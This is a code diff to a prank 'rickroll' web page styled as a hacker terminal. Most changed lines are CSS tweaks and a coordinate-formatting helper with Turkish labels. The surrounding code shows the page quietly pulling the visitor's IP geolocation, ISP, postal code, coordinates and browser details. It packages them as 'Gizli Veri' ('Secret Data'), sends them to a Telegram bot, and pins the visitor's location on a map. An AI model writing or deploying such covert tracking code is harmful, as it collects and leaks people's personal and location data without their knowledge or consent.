@@ -17,7 +17,7 @@
     #container {
       width: 90vw;
       max-width: 800px;
-      height: 80vh;
+      height: 85vh;
       background-color: black;
       border-radius: 8px;
       padding: 20px;
@@ -26,35 +26,39 @@
       box-shadow: 0 0 20px #00ff00;
       white-space: pre-wrap;
       user-select: none;
-      z-index: 10;
       display: flex;
       flex-direction: column;
     }
     #terminal {
       flex: 1 1 auto;
       overflow-y: auto;
+      margin-bottom: 15px;
+      font-size: 14px;
+      line-height: 1.4;
     }
     #map {
-      flex: 0 0 250px;
-      margin-top: 10px;
+      flex: 0 0 300px;
       border: 2px solid #00ff00;
       border-radius: 6px;
+      margin-bottom: 20px;
     }
     #rickrollButton {
-      margin-top: 15px;
       background: #00ff00;
       color: black;
-      padding: 10px 20px;
+      padding: 18px 40px;
       border: none;
-      border-radius: 6px;
+      border-radius: 10px;
       font-weight: bold;
       cursor: pointer;
       user-select: none;
+      font-size: 20px;
+      align-self: center;
       transition: background 0.3s ease;
-      align-self: flex-start;
+      box-shadow: 0 0 15px #00ff00;
     }
     #rickrollButton:hover {
       background: #00cc00;
+      box-shadow: 0 0 25px #00ff00;
     }
   </style>
 
@@ -83,7 +87,6 @@
   <script>
     const terminal = document.getElementById('terminal');
     const button = document.getElementById('rickrollButton');
-    const mapDiv = document.getElementById('map');
 
     function logToTerminal(text) {
       terminal.textContent += text + '\n';
@@ -92,6 +95,22 @@
 
     function getCurrentTime() {
       return new Date().toLocaleString();
+    }
+
+    function decToDMS(deg) {
+      const absolute = Math.abs(deg);
+      const degrees = Math.floor(absolute);
+      const minutes = ((absolute - degrees) * 60).toFixed(1);
+      return {degrees, minutes};
+    }
+
+    function formatCoordinate(lat, lon) {
+      const latDMS = decToDMS(lat);
+      const lonDMS = decToDMS(lon);
+      const latCardinal = lat >= 0 ? "Kuzey" : "Güney";
+      const lonCardinal = lon >= 0 ? "Doğu" : "Batı";
+
+      return `${latDMS.degrees}°${latDMS.minutes}' ${latCardinal}, ${lonDMS.degrees}°${lonDMS.minutes}' ${lonCardinal}`;
     }
 
     async function sendToTelegram(message) {
@@ -120,6 +139,8 @@
         const res = await fetch('https://ipapi.co/json/');
         const data = await res.json();
 
+        const coordsFormatted = formatCoordinate(data.latitude, data.longitude);
+
         const message = `Gizli Veri:\n` +
           `IP: ${data.ip}\n` +
           `Şehir: ${data.city}\n` +
@@ -127,8 +148,7 @@
           `Posta Kodu: ${data.postal}\n` +
           `Ülke: ${data.country_name}\n` +
           `ISP: ${data.org}\n` +
-          `Latitude: ${data.latitude}\n` +
-          `Longitude: ${data.longitude}\n\n` +
+          `Koordinatlar: ${coordsFormatted}\n\n` +
 
           `Tarayıcı Bilgileri:\n` +
           `User Agent: ${navigator.userAgent}\n` +
@@ -158,7 +178,6 @@
     }
 
     function showMap(lat, lon) {
-      // Leaflet haritası oluştur
       const map = L.map('map').setView([lat, lon], 13);
 
       L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
@@ -167,7 +186,7 @@
       }).addTo(map);
 
       L.marker([lat, lon]).addTo(map)
-        .bindPopup(`Konumunuz: [${lat.toFixed(4)}, ${lon.toFixed(4)}]`)
+        .bindPopup(`Konumunuz: ${formatCoordinate(lat, lon)}`)
         .openPopup();
     }
 
